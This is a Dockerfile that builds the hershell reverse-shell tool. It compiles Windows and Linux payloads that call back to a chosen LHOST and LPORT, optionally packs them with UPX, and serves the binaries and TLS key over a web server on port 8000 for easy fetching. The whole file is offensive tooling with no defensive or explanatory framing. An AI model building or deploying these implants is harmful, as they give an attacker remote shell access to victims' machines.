FROM golang:alpine
RUN apk add --update make bash git openssl upx && go get github.com/lesnuages/hershell && go get -u github.com/fogleman/serve
WORKDIR /go/src/github.com/lesnuages/hershell/

ARG LHOST=127.0.0.1
ARG LPORT=8080
ARG GOARCH=64

# Build for both archs. Binaries use the same TLS cert. Cert/key are exported to the bin dir for easy fetch
# Binaries are packed using UPX, originals are kept too. Compression ratio is about 50%
# Easily download results from the container by running it and browsing to its port 8000
# docker run -it -p "8000:8000" hershell:latest

# todo add osx
RUN make depends && make windows${GOARCH} LHOST=${LHOST} LPORT=${LPORT} \
    && make linux${GOARCH} LHOST=${LHOST} LPORT=${LPORT} \
    && cp server.key server.pem *.exe /go/bin/
    
    # && upx -kv -9 /go/bin/hershell /go/bin/hershell.exe

EXPOSE 8000
ENTRYPOINT [ "serve", "-dir", "/go/bin/"]
